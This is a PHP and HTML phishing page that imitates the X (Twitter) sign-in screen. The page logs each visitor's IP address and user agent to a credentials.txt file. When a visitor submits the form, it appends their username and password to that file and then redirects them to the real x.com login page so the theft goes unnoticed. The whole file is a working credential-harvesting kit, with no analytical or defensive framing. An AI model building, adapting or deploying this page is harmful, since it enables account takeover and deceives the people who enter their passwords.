<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>X.</title>
<link rel="icon" type="image/x-icon" href="./x.ico">
<style>
    body {
        font-family: 'Arial', sans-serif;
        background-color: #000; /* Set background to black */
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .login-popup {
        background-color: #ffffff;
        border: 1px solid #e1e8ed;
        border-radius: 8px;
        padding: 30px;
        width: 400px;
        box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.5);
        text-align: center;
        position: relative;
        z-index: 10;
    }

    .login-popup h2 {
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 25px;
        color: #1da1f2;
    }

		h1 {
        color: #000;
				font-size: 42px;
		}

    .login-form input {
        width: 90%;
        padding: 12px;
        margin: 10px 0;
        border: 1px solid #ccd6dd;
        border-radius: 6px;
        font-size: 14px;
    }

    .login-form button {
        width: 90%;
        padding: 12px;
        background-color: #1da1f2;
        color: #fff;
        border: none;
        border-radius: 6px;
        font-weight: bold;
        cursor: pointer;
        font-size: 16px;
    }

    .login-form button:hover {
        background-color: #0a8bd8;
    }

    .signup-link {
        margin-top: 20px;
        font-size: 14px;
    }

    .signup-link a {
        color: #1da1f2;
        text-decoration: none;
        font-weight: bold;
    }

    .signup-link a:hover {
        text-decoration: underline;
    }

    /* Add a dimmed background effect */
    .background-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        z-index: 5;
    }
</style>
</head>
<body>

<div class="background-overlay"></div>

<div class="login-popup">
    <form class="login-form" action="" method="post">
        <img src="./x.png" alt="X Logo" class="logo" width=100px>
				<h1>Sign in to X</h1>
        <input type="text" name="username" placeholder="Email address or phone number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
        <div class="signup-link">Don't have an account? <a href="https://x.com/signup">Sign Up</a></div>
    </form>
</div>

</body>
</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
  $ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "\n|-------------------TWITTER-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
file_put_contents($filename, $data, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------TWITTER-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);
    header("Location: https://x.com/login");
}
?>
